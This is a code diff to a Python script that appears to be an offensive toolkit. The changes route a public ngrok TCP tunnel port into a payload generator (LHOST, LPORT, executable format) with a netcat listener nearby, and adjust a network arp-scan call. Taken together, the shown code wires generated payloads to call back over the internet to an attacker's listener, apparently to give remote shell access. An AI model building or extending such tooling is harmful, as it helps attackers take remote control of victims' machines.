@@ -238,8 +238,7 @@ else:
 
 
 
-def startNgrokServer():
-    ngrokPORT = input("\n LOCAL PORT > ") 
+def startNgrokServer(ngrokPORT):
 
     command = f"gnome-terminal --geometry=80x24+1000+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
     subprocess.run(command, shell=True)
@@ -292,7 +291,8 @@ def setPayload():
         lanORwan = input("\n Start WAN server? Y/N: ")
 
         if lanORwan.lower() == "y":
-            startNgrokServer()
+            ngrok_PORT = input("\n LOCAL PORT > ") 
+            startNgrokServer(ngrokPORT=ngrok_PORT)
         elif lanORwan.lower() == "n":
             pass
         else:
@@ -311,9 +311,15 @@ def setPayload():
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
 
         if choice == "1":
-            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME)
+            if lanORwan.lower() == "y":
+                createPayload(modulo=1, LHOST=HOST, LPORT=ngrok_PORT, NAME=NAME)
+            elif lanORwan.lower() == "n":
+                createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "2":
-            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME)
+            if lanORwan.lower() == "y":
+                createPayload(modulo=2, LHOST=HOST, LPORT=ngrok_PORT, NAME=NAME)
+            elif lanORwan.lower() == "n":
+                createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "3":
             module = input(f"\n Module {Fore.CYAN}> {Style.RESET_ALL}")
             FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
@@ -385,7 +391,7 @@ def netcatListener():
 def arp_scan():
     os.system("clear")
     print(haxlopa)
-    os.system("\n\nsudo arp-scan -l")
+    os.system("\n\narp-scan -l")
 
     back = input(f"{Fore.RED}\n\n[❔] Back? Y/N: {Style.RESET_ALL}")
     if back.lower() == "y":
